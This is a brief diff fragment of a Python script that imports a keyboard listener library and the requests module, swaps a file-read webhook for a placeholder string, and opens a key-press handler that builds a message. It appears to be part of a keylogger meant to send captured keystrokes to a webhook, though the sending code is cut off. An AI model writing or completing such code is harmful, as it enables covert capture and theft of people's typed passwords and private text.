@@ -1,7 +1,7 @@
 from pynput import keyboard
 import requests
 
-webhook = open("webhook.bin", "w") # used bin cuz why not. Make sure you already have a webhook.bin file and the webhook written already.
+webhook = "yourwebhookhere"
 
 def keyPressed(key):
     message = {
